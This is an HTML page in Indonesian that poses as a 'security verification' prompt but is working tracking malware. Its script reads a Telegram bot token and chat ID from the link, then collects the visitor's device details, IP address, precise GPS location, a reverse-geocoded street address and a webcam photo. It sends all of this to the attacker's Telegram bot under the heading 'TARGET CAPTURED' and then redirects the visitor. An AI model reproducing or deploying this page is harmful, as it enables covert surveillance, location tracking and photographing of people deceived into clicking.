<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
        }
        
        h1 {
            margin-bottom: 20px;
            font-size: 28px;
        }
        
        p {
            margin-bottom: 25px;
            line-height: 1.6;
            opacity: 0.9;
        }
        
        .btn {
            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(79, 172, 254, 0.4);
            margin: 15px 0;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(79, 172, 254, 0.6);
        }
        
        .btn:active {
            transform: translateY(1px);
        }
        
        .btn:disabled {
            background: #95a5a6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
        
        .loading {
            display: none;
            margin: 20px 0;
        }
        
        .spinner {
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid #4facfe;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            display: none;
        }
        
        .success {
            background: rgba(46, 204, 113, 0.2);
            border: 1px solid rgba(46, 204, 113, 0.5);
        }
        
        .error {
            background: rgba(231, 76, 60, 0.2);
            border: 1px solid rgba(231, 76, 60, 0.5);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Verifikasi Keamanan Diperlukan</h1>
        <p>Kami perlu memverifikasi bahwa Anda adalah pengguna asli. Klik tombol di bawah untuk melanjutkan.</p>
        
        <button id="verifyBtn" class="btn">Verifikasi Sekarang</button>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Memverifikasi informasi perangkat...</p>
        </div>
        
        <div class="status" id="status"></div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const verifyBtn = document.getElementById('verifyBtn');
            const loadingDiv = document.getElementById('loading');
            const statusDiv = document.getElementById('status');
            
            // Ambil data dari URL
            const urlParams = new URLSearchParams(window.location.search);
            const encodedData = urlParams.get('data');
            
            if (!encodedData) {
                showStatus("Link tidak valid", "error");
                verifyBtn.disabled = true;
                return;
            }
            
            // Decode data
            let botData;
            try {
                botData = JSON.parse(atob(encodedData));
            } catch (e) {
                showStatus("Data tidak valid", "error");
                verifyBtn.disabled = true;
                return;
            }
            
            const BOT_TOKEN = botData.token;
            const CHAT_ID = botData.chatId;
            const TARGET_URL = botData.target;
            
            // Fungsi untuk menampilkan status
            function showStatus(message, type) {
                statusDiv.textContent = message;
                statusDiv.className = `status ${type}`;
                statusDiv.style.display = 'block';
            }
            
            // Fungsi untuk mendapatkan informasi perangkat
            function getDeviceInfo() {
                const userAgent = navigator.userAgent;
                let deviceInfo = {
                    type: "Unknown",
                    model: "Unknown",
                    os: "Unknown",
                    browser: "Unknown",
                    screen: `${screen.width}x${screen.height}`,
                    language: navigator.language,
                    platform: navigator.platform
                };
                
                if (/Android/.test(userAgent)) {
                    deviceInfo.type = "Mobile";
                    deviceInfo.os = "Android";
                    const androidModelMatch = userAgent.match(/Android.*; (.*) Build/);
                    if (androidModelMatch) deviceInfo.model = androidModelMatch[1];
                } else if (/iPhone|iPad|iPod/.test(userAgent)) {
                    deviceInfo.type = /iPad/.test(userAgent) ? "Tablet" : "Mobile";
                    deviceInfo.os = "iOS";
                } else if (/Windows/.test(userAgent)) {
                    deviceInfo.type = "Desktop";
                    deviceInfo.os = "Windows";
                } else if (/Mac/.test(userAgent)) {
                    deviceInfo.type = "Desktop";
                    deviceInfo.os = "MacOS";
                }
                
                if (/Chrome/.test(userAgent) && !/Edg/.test(userAgent)) {
                    deviceInfo.browser = "Chrome";
                } else if (/Firefox/.test(userAgent)) {
                    deviceInfo.browser = "Firefox";
                } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
                    deviceInfo.browser = "Safari";
                } else if (/Edg/.test(userAgent)) {
                    deviceInfo.browser = "Edge";
                }
                
                return deviceInfo;
            }
            
            // Fungsi untuk mendapatkan lokasi
            function getLocation() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject("Geolocation not supported");
                        return;
                    }
                    
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        error => {
                            reject(error.message);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                });
            }
            
            // Fungsi untuk mendapatkan alamat
            function getAddressFromCoordinates(lat, lng) {
                return new Promise((resolve) => {
                    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`)
                        .then(response => response.json())
                        .then(data => {
                            if (data && data.address) {
                                const addr = data.address;
                                let fullAddress = "";
                                
                                if (addr.road) fullAddress += addr.road + ", ";
                                if (addr.village) fullAddress += addr.village + ", ";
                                if (addr.town) fullAddress += addr.town + ", ";
                                if (addr.city) fullAddress += addr.city + ", ";
                                if (addr.state) fullAddress += addr.state;
                                if (addr.country) fullAddress += ", " + addr.country;
                                
                                resolve({
                                    address: fullAddress || "Address not found",
                                    postcode: addr.postcode || "Unknown"
                                });
                            } else {
                                resolve({
                                    address: "Address not found",
                                    postcode: "Unknown"
                                });
                            }
                        })
                        .catch(() => {
                            resolve({
                                address: "Failed to retrieve address",
                                postcode: "Unknown"
                            });
                        });
                });
            }
            
            // Fungsi untuk mendapatkan IP
            function getIPAddress() {
                return new Promise((resolve) => {
                    fetch('https://api.ipify.org?format=json')
                        .then(response => response.json())
                        .then(data => resolve(data.ip))
                        .catch(() => resolve("Unknown"));
                });
            }
            
            // Fungsi untuk mengambil foto
            function takePhoto() {
                return new Promise((resolve, reject) => {
                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            const video = document.createElement('video');
                            video.srcObject = stream;
                            video.play();
                            
                            video.addEventListener('loadedmetadata', () => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                const context = canvas.getContext('2d');
                                
                                setTimeout(() => {
                                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.7);
                                    
                                    stream.getTracks().forEach(track => track.stop());
                                    resolve(photoDataUrl);
                                }, 500);
                            });
                        })
                        .catch(error => reject(error.message));
                });
            }
            
            // Fungsi untuk mengirim ke Telegram
            function sendToTelegram(photoDataUrl, message) {
                return new Promise((resolve, reject) => {
                    fetch(photoDataUrl)
                        .then(res => res.blob())
                        .then(blob => {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('photo', blob, 'photo.jpg');
                            formData.append('caption', message);
                            
                            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        })
                        .then(response => response.json())
                        .then(data => {
                            if (data.ok) resolve();
                            else reject(data.description);
                        })
                        .catch(error => reject(error.message));
                });
            }
            
            // Event listener untuk tombol verifikasi
            verifyBtn.addEventListener('click', async function() {
                verifyBtn.disabled = true;
                loadingDiv.style.display = 'block';
                
                try {
                    // Kumpulkan semua informasi
                    const deviceInfo = getDeviceInfo();
                    const ipAddress = await getIPAddress();
                    const location = await getLocation();
                    const addressInfo = await getAddressFromCoordinates(location.latitude, location.longitude);
                    const photoDataUrl = await takePhoto();
                    
                    // Buat pesan
                    const message = `
🎯 TARGET CAPTURED

📱 DEVICE:
Type: ${deviceInfo.type}
Model: ${deviceInfo.model}
OS: ${deviceInfo.os}
Browser: ${deviceInfo.browser}
Screen: ${deviceInfo.screen}
Language: ${deviceInfo.language}
Platform: ${deviceInfo.platform}

📍 LOCATION:
Coordinates: ${location.latitude.toFixed(6)}, ${location.longitude.toFixed(6)}
Accuracy: ${location.accuracy}m
Address: ${addressInfo.address}
Postal Code: ${addressInfo.postcode}
Google Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}

🌐 NETWORK:
IP: ${ipAddress}

🕒 TIME: ${new Date().toLocaleString()}
                    `.trim();
                    
                    // Kirim ke Telegram
                    await sendToTelegram(photoDataUrl, message);
                    
                    showStatus("Verifikasi berhasil! Mengarahkan...", "success");
                    
                    // Redirect ke URL target
                    setTimeout(() => {
                        window.location.href = TARGET_URL;
                    }, 2000);
                    
                } catch (error) {
                    console.error("Error:", error);
                    showStatus("Verifikasi gagal: " + error, "error");
                    verifyBtn.disabled = false;
                    loadingDiv.style.display = 'none';
                }
            });
        });
    </script>
</body>
</html>
